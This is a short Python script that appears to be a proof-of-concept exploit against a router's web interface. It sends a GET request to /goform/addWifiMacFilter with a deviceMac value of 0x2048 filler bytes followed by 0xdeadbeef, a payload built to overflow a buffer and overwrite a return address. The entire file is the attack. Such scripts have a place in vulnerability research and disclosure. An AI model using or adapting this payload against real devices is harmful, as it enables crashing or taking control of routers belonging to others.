import requests
def send_payload(url, id,mac):
    params = {'deviceId': id,'deviceMac': mac}
    response = requests.get(url, params=params)
    print(f"Status Code: {response.status_code}")
    print(f"Response Text: {response.text}")
url="http://192.168.1.1/goform/addWifiMacFilter"
id=""
mac=b'a'*0x2048+b"\xef\xbe\xad\xde"
send_payload(url, id, mac)